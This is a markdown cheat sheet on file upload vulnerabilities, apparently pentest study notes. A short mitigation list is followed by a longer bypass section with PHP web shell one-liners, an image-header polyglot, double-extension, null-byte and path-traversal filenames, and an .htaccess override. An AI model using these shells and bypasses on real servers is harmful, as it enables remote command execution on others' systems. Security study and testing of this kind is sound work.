## File Upload Vulnerabilities

- **What:** Occurs when an app allows uploading files without proper validation. Attackers can upload malicious files (web shells, scripts) and run them on the server. Even if only images are intended, uploading a renamed script or SVG with JS can attack users (XSS).
    
- **Example attacks:**
    
    - **Web shell upload:** Upload `shell.php` containing code like `<?php system($_GET['cmd']); ?>` and then access it to execute commands. Similarly, upload `.jsp` or `.asp` shells if the server runs those platforms.
    - **Bypass filters:** If extensions are checked, use tricks like `shell.php.jpg` or `shell.php%00.png` to bypass a naive `.jpg` filter. If MIME is checked, override it to an innocuous type (e.g. send a PHP file with `Content-Type: image/jpeg`).
    - **DLL/script injection:** Uploading scripts that exploit the processing library (ImageTragick, etc.).
    - **Denial-of-Service:** Upload huge files or zip bombs to exhaust disk space.
        
- **Payloads:**
    
    - PHP shell file (`shell.php`) with typical one-liner webshell code.
    - Polyglot file: e.g. valid image header + hidden script.
    - HTML file with `<script>` or SVG with JavaScript to attack browsers.
    - 
- **Mitigation:** Restrict uploads to an allow-list of safe extensions; sanitize file names; store uploads outside the webroot or on a different domain; verify file contents (magic numbers). Set strict size limits.
    

##  **How to bypass**

###  **1. Rename + Double Extension**

- Change the filename from `shell.php` → `shell.php.jpg`
###  **2. Fake the MIME type**

- When uploading via Burp Suite:
    
    - Intercept the request.
    - Find `Content-Type` in your `multipart/form-data` part.
    - Change it to `image/jpeg`.
    - Example:    
        `Content-Disposition: form-data; name="file"; filename="shell.php.jpg" Content-Type: image/jpeg`
        

---

###  **3. Add a fake image header**

Some servers do `getimagesize()` or similar checks.

- Prepend a fake image header:
    `GIF89a; <?php system($_GET['cmd']); ?>`
    
    or

    `<?php echo shell_exec($_GET['cmd']); ?>`
    
    or for JPEG:
    
    `ÿØÿà <?php ... ?>`
    

This tricks weak image validators.

---

###  **4. Null Byte Exploit** (Old, but worth testing)

If the server is using vulnerable old PHP:

- Upload as `shell.php%00.jpg`
    
- `%00` may terminate the filename string at `.php`.

Most modern PHP/NGINX setups patch this — but check anyway.

---

###  **5. Overwrite `.htaccess`**

If you can upload **ANY** file:

- Upload `.htaccess`:
        
    `AddType application/x-httpd-php .jpg`
    
    Now `shell.jpg` is treated as PHP when requested.
    
- Works only on Apache with `AllowOverride` enabled.
    

---

###  **6. Check for Path Traversal**

Some uploaders store files based on user input.

- Try uploading with paths:
    
    - `../../shell.php` as filename.
        
    - `..%2f..%2fshell.php`
        
- If you can break out of `/uploads/` to `/var/www/html/`, you win.
    

---

###  **7. Exploit Image Processing Bugs**

If exif data is not sanitized:

- Insert PHP in exif:
    
    - Use `exiftool` to write PHP code into `image description`.
        
    - On a vulnerable eval chain, the server might execute it.
        
    - Rare but real: Google “PHP exif shell”.
        

---
##  **If that fails**

- Try all extensions: `.php3`, `.php4`, `.phtml`, `.php5`
    
- Try `.php;.jpg`, `.php%20.jpg`
    
- Try `.phar` (some servers parse `.phar` as PHP)
    
- Try misconfigurations: `index.php` overwrites.
    

---